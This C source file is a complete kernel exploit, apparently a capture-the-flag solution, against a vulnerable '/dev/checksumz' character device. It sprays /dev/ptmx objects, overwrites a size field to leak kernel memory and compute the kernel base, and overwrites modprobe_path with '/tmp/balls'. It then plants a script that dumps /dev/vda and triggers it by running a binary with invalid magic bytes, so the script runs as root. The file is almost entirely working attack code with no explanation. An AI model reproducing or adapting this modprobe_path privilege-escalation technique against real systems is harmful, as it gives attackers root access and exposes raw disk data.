#include "api.h"
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>
#include <sys/ioctl.h>

int fd;
unsigned long long mem[300];
int idx = 0;

unsigned long long kbase;

void print_as_qwords(char* buf, int num) {
  long long alice;

  for (int i = 0; i < num; i++) {
    alice = *(long long *)(buf + i * 8);
    mem[idx++] = alice;

    printf("0x%llx ", alice);

    if (i % 2 == 1) printf("\n%d: ", idx);
  }
}

void get_kbase() {
  kbase = mem[36] - 0x1289360;

  printf("[*] KBASE LEAK: 0x%llx\n", kbase);
}

void overwrite_modprobepath() {
  lseek(fd, 528, SEEK_SET);

  unsigned long long modprobe = kbase + 0x1b3f100;
  write(fd, &modprobe, 8);
   
  char new_path[] = "/tmp/balls";
  ioctl(fd, CHECKSUMZ_IOCTL_RENAME, new_path);
}

void read_struct() {
  lseek(fd, 504, SEEK_SET);

  char buf[0x100];

  for (int i = 0; i < 8; i++) {
    read(fd, buf, 0x100);

    print_as_qwords(buf, 0x10);
  }
  putchar(10);
}

void overwrite_size() {
  lseek(fd, 504, SEEK_SET);

  char buf[16] = "AAAAAAAABBBBBBBB";
  write(fd, buf, 16);
}

int main() {
    int tmp = open("/dev/ptmx", O_RDWR);

    for (int i = 0; i < 100; i++) {
      tmp = open("/dev/ptmx", O_RDWR);
    }

    fd = open("/dev/checksumz", O_RDWR);

    for (int i = 0; i < 100; i++) {
      tmp = open("/dev/ptmx", O_RDWR);
    }

    puts("[*] GETTING MEMORY DUMP");
    overwrite_size();
    read_struct();

    puts("[*] GETTING KERNEL BASE LEAK");
    get_kbase();

    puts("[*] OVERWRITING MOD PROBE PATH");
    overwrite_modprobepath();

    puts("[*] CREATING MODPROBE SCRIPT");
    system("echo -en '#!/bin/sh\ncat /dev/vda > /tmp/flag' > /tmp/balls");
    system("chmod +x /tmp/balls");

    puts("[*] FINISHED OVERWRITING MOD PROBE PATH, NOW RUNNING BINARY WITH MODIFIED MAGIC BYTES");
    system("/home/user/magic");
}
